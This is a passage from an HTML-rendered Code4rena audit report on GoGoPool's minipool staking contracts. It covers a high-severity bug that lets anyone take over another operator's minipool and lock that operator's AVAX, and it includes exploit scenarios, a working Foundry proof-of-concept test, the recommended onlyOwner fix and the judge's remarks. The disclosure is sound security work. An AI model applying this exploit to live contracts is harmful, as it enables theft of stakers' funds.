nodeID</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t// If nodeID exists, only allow overwriting if node is finished or canceled</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t// \t\t(completed its validation period and all rewards paid and processing is complete)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tint256 minipoolIndex = getIndexOf(nodeID);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tif (minipoolIndex != -1) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t\trequireValidStateTransition(minipoolIndex, MinipoolStatus.Prelaunch);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t\tresetMinipoolData(minipoolIndex);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">----------</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tsetUint(keccak256(abi.encodePacked(&quot;minipool.item&quot;, minipoolIndex, &quot;.status&quot;)), uint256(MinipoolStatus.Prelaunch));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">----------</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tsetAddress(keccak256(abi.encodePacked(&quot;minipool.item&quot;, minipoolIndex, &quot;.owner&quot;)), msg.sender);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">----------</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t}</span></span></code></pre>\n<p>THE BUG: <code>createMinipool</code> can be called by <strong>Anyone</strong> with the <code>nodeID</code> of any node operator.</p>\n<p>If <code>createMinipool</code> is called at the <code>Withdrawable</code> state or <code>Error</code> state:</p>\n<ul>\n<li>The transaction will be allowed</li>\n<li>The owner of the minipool will be switched to the caller.</li>\n</ul>\n<p>Therefore, the minipool is hijacked and the node operator will not be able to withdraw their funds.</p>\n<p><strong>Exploit scenarios</strong></p>\n<p>As shown above, an attacker can <strong>always</strong> hijack the minipool and lock the node operators funds.</p>\n<ol>\n<li>Cancel the minipool</li>\n<li>Earn rewards on behalf of original NodeOp</li>\n</ol>\n<p><strong><em>Scenario #1 - Cancel the minipool</em></strong></p>\n<p>A hacker can hijack the minipool and immediately cancel the pool after a 14 day period is finished or an error state.\nResults:</p>\n<ol>\n<li>Node operator will lose all his staked AVAX<br>\n1.1. This can be done by a malicious actor to <strong>ALL</strong> GoGoPool stakers to lose their funds in a period of 14 days.<br></li>\n<li>Hacker will not lose anything and not gain anything.</li>\n</ol>\n<p>Consider the following steps:</p>\n<ol>\n<li>Hacker creates a node and creates a minipool <code>node-1337</code>.</li>\n<li>NodeOp registers a nodeID <code>node-123</code> and finished the 14 days stake period. State is <code>Withdrawable</code>.</li>\n<li>Hacker calls <code>createMinipool</code> with <code>node-123</code> and deposits 1000 AVAX. Hacker is now owner of the minipool</li>\n<li>Hacker calls <code>cancelMinipool</code> of <code>node-123</code>  and receives his staked 1000 AVAX.</li>\n<li>NodeOp cannot withdraw his staked AVAX as NodeOp is no longer the owner.</li>\n<li>Hacker can withdraw staked AVAX for both <code>node-1337</code> and <code>node-123</code></li>\n</ol>\n<p>The above step #1 is <strong>not</strong> necessary but allow the hacker to immediately cancel the minipool without waiting 5 days.<br>\n(See other submitted bug #211: “Anti griefing mechanism can be bypassed”)</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"9\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">       ┌───────────┐               ┌───────────┐            ┌───────────┐              ┌───────────┐</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">       │           │               │           │            │           │              │           │</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">       │   Rialto  │               │  NodeOp   │            │  Minipool │              │ Hacker    │</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">       │           │               │           │            │  Manager  │              │           │</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">       └─────┬─────┘               └─────┬─────┘            └─────┬─────┘              └─────┬─────┘</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">             │claimAndInitiate(Node-1337)│                        │createMinipool(Node-1337) │</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">             │recordStakingStart(...)    │                        │◄─────────────────────────┤ ┌────────────┐</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">             ├───────────────────────────┼───────────────────────►│                          │ │ 1000 AVAX  │</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">             │                           │                        │                          │ │ 100 GPP    │</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">             │                           │createMinipool(Node-123)│                          │ └────────────┘</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">             │claimAndInitiate(Node-123) ├───────────────────────►│                          │</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">             │recordStakingStart(...)    │                        │                          │</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">             ├───────────────────────────┼───────────────────────►│                          │</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">┌──────────┐ │                           │                        │                          │</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">│14 days   │ │recordStakingEnd(Node-1337)│                        │                          │</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">└──────────┘ │recordStakingEnd(Node-123) │//STATE: WITHDRAWABLE// │                          │ ┌────────────┐</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">             ├───────────────────────────┼───────────────────────►│                          │ │ 1000 AVAX  │</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">             │                           │                        │createMinipool(Node-123)  │ │Hacker=Owner│</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">             │                           │                        │◄─────────────────────────┤ └────────────┘</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">             │                           │withdrawMinipoolF..(123)│                          │</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">             │                           ├───────────────────────►│cancleMinipool(Node-123)  │</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">             │                           │       REVERT!          │◄─────────────────────────┤</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">             │                           │◄───────────────────────┤      1000 AVAX           │</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">             │                           │                        ├─────────────────────────►│</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">             │                           │   ┌────────────────┐   │withdrawMinipoolFunds(1337│ ┌──────────┐</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">             │                           │   │  NodeOp loses  │   │◄─────────────────────────┤ │Withdraw  │</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">             │                           │   │  his 1000 AVAX │   │      1000 AVAX + REWARDS │ │stake and │</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">             │                           │   │  Stake, cannot │   ├─────────────────────────►│ │rewards   │</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">             │                           │   │  withdraw      │   │                          │ └──────────┘</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">             │                           │   └────────────────┘   │     ┌───────────────┐    │</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">             │                           │                        │     │Hacker loses no│    │</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">             │                           │                        │     │funds, can     │    │</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">             │                           │                        │     │withdraw GPP   │    │</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">             │                           │                        │     └───────────────┘    │</span></span></code></pre>\n<p><strong><em>Scenario #2 - Use node of node operator</em></strong></p>\n<p>In this scenario the NodeOp registers for a duration longer then 14 days. The hacker will hijack the minipool after 14 days and earn rewards on behalf of the node operators node for the rest of the duration.<br>\nAs the NodeOp registers for a longer period of time, it is likely he will not notice he is not the owner of the minipool and continue to use his node to validate Avalanche.</p>\n<p>Results:</p>\n<ol>\n<li>Node operator will lose all his staked AVAX</li>\n<li>Hacker will gain rewards for staking without hosting a node</li>\n</ol>\n<p>Important to note:</p>\n<ul>\n<li>This scenario is only possible if <code>recordStakingEnd</code> and <code>recreateMinipool</code> are <strong>not</strong> called in the same transaction by <code>rialto</code>.</li>\n<li>During the research the sponsor has elaborated that they plan to perform the calls in the same transaction.</li>\n<li>The sponsor requested to submit issues related to <code>recordStakingEnd</code> and <code>recreateMinipool</code> single/multi transactions for information and clarity anyway.</li>\n</ul>\n<p>Consider the following steps:</p>\n<ol>\n<li>Hacker creates a node and creates a minipool <code>node-1337</code>.</li>\n<li>NodeOp registers a nodeID <code>node-123</code> for 28 days duration and finished the 14 days stake period. State is <code>Withdrawable</code>.</li>\n<li>Hacker calls <code>createMinipool</code> with <code>node-1234</code> and deposits 1000 AVAX. Hacker is now owner of minipool</li>\n<li>Rialto calls <code>recreateMinipool</code> to restake the minipool in Avalanche. (This time: the owner is the hacker, the hardware is NodeOp)</li>\n<li>14 days have passed, hacker can withdraw the rewards and 1000 staked AVAX</li>\n<li>NodeOps cannot withdraw staked AVAX.</li>\n</ol>\n<p><strong>Foundry POC</strong></p>\n<p>The POC will demonstrate scenario #1.</p>\n<p>Add the following test to <code>MinipoolManager.t.sol</code>: <br><a href=\"https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/test/unit/MinipoolManager.t.sol#L175\">https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/test/unit/MinipoolManager.t.sol#L175</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"10\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">\tfunction testHijackMinipool() public {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tuint256 duration = 2 weeks;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tuint256 depositAmt = 1000 ether;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tuint256 avaxAssignmentRequest = 1000 ether;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tuint256 rewards = 10 ether;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tuint256 expectedRewards = (rewards/2)+(rewards/2).mulWadDown(dao.getMinipoolNodeCommissionFeePct());</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tuint256 validationAmt = depositAmt + avaxAssignmentRequest;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tuint128 ggpStakeAmt = 100 ether;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\taddress hacker = address(0x1337);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t// Fund hacker with exact AVAX and gpp</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tvm.deal(hacker, depositAmt*2);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tdealGGP(hacker, ggpStakeAmt);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t// Fund nodeOp with exact AVAX and gpp</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tnodeOp = address(0x123);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tvm.deal(nodeOp, depositAmt);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tdealGGP(nodeOp, ggpStakeAmt);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t// fund ggAVAX</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\taddress lilly = getActorWithTokens(&quot;lilly&quot;, MAX_AMT, MAX_AMT);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tvm.prank(lilly);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tggAVAX.depositAVAX{value: MAX_AMT}();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tassertEq(lilly.balance, 0);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tvm.startPrank(hacker);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t// Hacker stakes GGP</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tggp.approve(address(staking), ggpStakeAmt);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tstaking.stakeGGP(ggpStakeAmt);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t// Create minipool for hacker</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tMinipoolManager.Minipool memory hackerMp = createMinipool(depositAmt, avaxAssignmentRequest, duration);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tvm.stopPrank();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tvm.startPrank(nodeOp);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t// nodeOp stakes GGP</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tggp.approve(address(staking), ggpStakeAmt);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tstaking.stakeGGP(ggpStakeAmt);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t// Create minipool for nodeOp</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tMinipoolManager.Minipool memory nodeOpMp = createMinipool(depositAmt, avaxAssignmentRequest, duration);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tvm.stopPrank();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t// Rialto stakes both hackers and nodeOp in avalanche </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tvm.startPrank(address(rialto));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tminipoolMgr.claimAndInitiateStaking(nodeOpMp.nodeID);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tminipoolMgr.claimAndInitiateStaking(hackerMp.nodeID);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t// Update that staking has started</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tbytes32 txID = keccak256(&quot;txid&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tminipoolMgr.recordStakingStart(nodeOpMp.nodeID, txID, block.timestamp);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tminipoolMgr.recordStakingStart(hackerMp.nodeID, txID, block.timestamp);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t// Skip 14 days of staking duration</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tskip(duration);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t// Update that staking has ended and funds are withdrawable</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tminipoolMgr.recordStakingEnd{value: validationAmt + rewards}(nodeOpMp.nodeID, block.timestamp, 10 ether);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tminipoolMgr.recordStakingEnd{value: validationAmt + rewards}(hackerMp.nodeID, block.timestamp, 10 ether);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tvm.stopPrank();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t/// NOW STATE: WITHDRAWABLE ///</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tvm.startPrank(hacker);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t// Hacker creates a minipool using nodeID of nodeOp</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t// Hacker is now the owner of nodeOp minipool</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tminipoolMgr.createMinipool{value: depositAmt}(nodeOpMp.nodeID, duration, 0.02 ether, avaxAssignmentRequest);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t// Hacker immediatally cancels the nodeOp minipool, validate 1000 AVAX returned</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tminipoolMgr.cancelMinipool(nodeOpMp.nodeID);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tassertEq(hacker.balance, depositAmt);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t// Hacker withdraws his own minipool and receives 1000 AVAX + rewards</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tminipoolMgr.withdrawMinipoolFunds(hackerMp.nodeID);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tassertEq(hacker.balance, depositAmt + depositAmt + expectedRewards);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t// Hacker withdraws his staked ggp</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tstaking.withdrawGGP(ggpStakeAmt);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tassertEq(ggp.balanceOf(hacker), ggpStakeAmt);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tvm.stopPrank();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tvm.startPrank(nodeOp);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t// NodeOp tries to withdraw his funds from the minipool</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t// Transaction reverts because NodeOp is not the owner anymore</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tvm.expectRevert(MinipoolManager.OnlyOwner.selector);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tminipoolMgr.withdrawMinipoolFunds(nodeOpMp.nodeID);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t// NodeOp can still release his staked gpp</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tstaking.withdrawGGP(ggpStakeAmt);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tassertEq(ggp.balanceOf(nodeOp), ggpStakeAmt);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tvm.stopPrank();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t}</span></span></code></pre>\n<p>To run the POC, execute:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"11\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">forge test -m testHijackMinipool -v</span></span></code></pre>\n<p>Expected output:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"12\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">Running 1 test for test/unit/MinipoolManager.t.sol:MinipoolManagerTest</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">[PASS] testHijackMinipool() (gas: 2346280)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">Test result: ok. 1 passed; 0 failed; finished in 9.63s</span></span></code></pre>\n<h3 id=\"tools-used-1\" style=\"position:relative;\"><a href=\"#tools-used-1\" aria-label=\"tools used 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>VS Code, Foundry</p>\n<h3 id=\"recommended-mitigation-steps-3\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-3\" aria-label=\"recommended mitigation steps 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Fortunately, the fix is very simple.<br>\nThe reason <code>createMinipool</code> is called with an existing <code>nodeID</code> is to re-use the <code>nodeID</code> again with the protocol. GoGoPool can validate that the owner is the same address as the calling address. GoGoPool have already implemented a function that does this: <code>onlyOwner(index)</code>.</p>\n<p>Consider placing <code>onlyOwner(index)</code> in the following area: <br><a href=\"https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L243\">https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L243</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"13\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">\tfunction createMinipool(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\taddress nodeID,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tuint256 duration,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tuint256 delegationFee,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tuint256 avaxAssignmentRequest</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t) external payable whenNotPaused {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">----------</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tint256 minipoolIndex = getIndexOf(nodeID);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\tif (minipoolIndex != -1) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                        onlyOwner(minipoolIndex); // AUDIT: ADDED HERE</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">----------</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t\t} else {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">----------</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">\t}</span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/213#issuecomment-1410348485\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>The Warden has shown how, due to a lax check for State Transition, a Pool ID can be hijacked, causing the loss of the original deposit</p>\n<p>Because the attack is contingent on a logic flaw and can cause a complete loss of Principal, I agree with High Severity.</p>\n<p>Separate note: I created <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/904\">issue 904</a>. For the Finding 2 of this report, please refrain from grouping findings especially when they use different functions and relate to different issues.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-02-gogopool-mitigation-contest#mitigations-to-be-reviewed\">emersoncloud (GoGoPool) mitigated</a>:</strong></p>\n<blockquote>\n<p>Atomically recreate minipool to not allow hijack: <a href=\"https://github.com/multisig-labs/gogopool/pull/23\">multisig-labs/gogopool#23</a></p>\n</blockquote>\n<p><strong>Status:</strong> Mitigation confirmed, but a new medium severity issue was found. Full details in <a href=\"https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/23\">report from hansfriese</a>, and also included in Mitigation Review section below.</p>\n<hr>\n<h2 id=\"h-05-inflation-of-ggavax-share-price-by-first-depositor\" style=\"position:relative;\"><a href=\"#h-05-inflation-of-ggavax-share-price-by-first-depositor\" aria-label=\"h 05 inflation of ggavax share price by first depositor permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/209\">[H-05] Inflation of ggAVAX share price by first depositor</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/209\">0xdeadbeef0x</a>, also found by <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/872\">eierina</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/853\">ak1</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/832\">datapunk</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/815\">0xNazgul</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/801\">Qeew</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/775\">Breeje</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/770\">SamGMK</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/736\">IllIllI</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/672\">TomJ</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/663\">sces60107</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/658\">WatchDogs</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/607\">Arbor-Finance</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/588\">SmartSek</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/573\">hansfriese</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/527\">tonisives</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/456\">peanuts</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/411\">unforgiven</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/389\">0xSmartContract</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/379\">fs0c</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/336\">ck</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/319\">0xbepresent</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/285\">yongskiws</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/204\">0xLad</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/187\">btk</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/179\">rvierdiiev</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/155\">koxuan</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/147\">ladboy233</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/96\">Rolezn</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/68\">HE1M</a>, <a 